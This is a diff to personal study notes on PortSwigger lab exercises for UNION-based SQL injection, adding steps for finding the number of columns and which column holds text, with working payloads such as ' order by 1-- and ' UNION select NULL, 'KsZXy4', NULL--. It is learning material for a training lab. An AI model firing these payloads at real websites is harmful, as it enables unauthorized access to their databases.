@@ -124,6 +124,7 @@ Rule:
 - The number and the order of the columns must be the same in all queries
 - The data types must be compatible
 
+**Step #1: Determine # of columns**
 
 SQLi attack (way #1):  Union operator SQL(Microsoft):
 https://learn.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver16
@@ -165,3 +166,19 @@ https://0aed007503ed3a1fa9f7494e002b00e3.web-security-academy.net/filter?categor
 
 # Lab: SQL injection UNION attack, finding a column containing text(https://portswigger.net/web-security/sql-injection/union-attacks)
 
+**Step #2: Determine the data type of the columns**
+
+select a, b, c from table1 UNION select NULL, NULL, 'a'    ('+UNION+SELECT+'abcdef',NULL,NULL--)
+-> error -> column is not type text
+-> no error -> column is of type text
+
+Analysis:
+
+' order by 1--
+-> 3 columns -> 1st column is not shown on the page.
+
+' UNION select NULL, 'KsZXy4', NULL--
+-> 2nd column of type string
+
+' UNION select 'a', NULL, NULL--'
+' UNION select NULL, 'a', NULL--
